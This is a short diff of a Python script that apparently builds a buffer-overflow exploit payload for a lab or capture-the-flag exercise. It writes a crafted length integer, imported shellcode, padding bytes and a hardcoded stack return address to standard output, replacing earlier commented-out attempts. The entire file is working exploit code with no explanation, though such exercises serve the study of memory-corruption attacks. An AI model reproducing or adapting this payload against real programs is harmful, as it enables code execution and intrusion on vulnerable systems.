@@ -1,15 +1,11 @@
 import sys
 import struct
+from shellcode import shellcode
 
 output = ""
-
-output += struct.pack('<i', -1)
-
-output += struct.pack('<i', -2500)
-
-#output += struct.pack('<I', 2863311530)
+output += struct.pack('<I', 1073741825)
+output += shellcode
+output += "\xAA"*7
+output += "\x80\xfb\xfe\xbf"
 sys.stdout.write(output)
 
-#from shellcode import shellcode
-
-#print shellcode + "\xAA"*1995 + "\xa8\xf3\xfe\xbf" + "\xbc\xfb\xfe\xbf"
